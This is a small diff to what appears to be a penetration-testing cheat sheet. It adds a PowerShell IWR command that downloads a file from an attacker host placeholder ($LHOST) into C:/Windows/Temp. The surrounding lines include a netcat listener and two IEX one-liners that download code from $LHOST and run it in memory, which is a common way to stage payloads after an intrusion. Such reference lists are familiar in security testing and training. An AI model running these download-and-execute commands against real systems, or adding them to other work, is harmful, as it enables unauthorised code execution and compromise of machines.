@@ -207,6 +207,7 @@ nc -lp 8888 > outfile
 ```
 ### Windows Powershell
 ```powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', '$PATH\outfile')``` <- download file to disk\
+```powershell IWR -uri http://$LHOST/file -o C:/Windows/Temp/file``` <- download file to disk\
 ```powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')"``` <- download and exec on memory\
 ```powershell "IEX( IWR $LHOST/$FILE -UseBasicParsing)"``` <- download and exec on memory
 
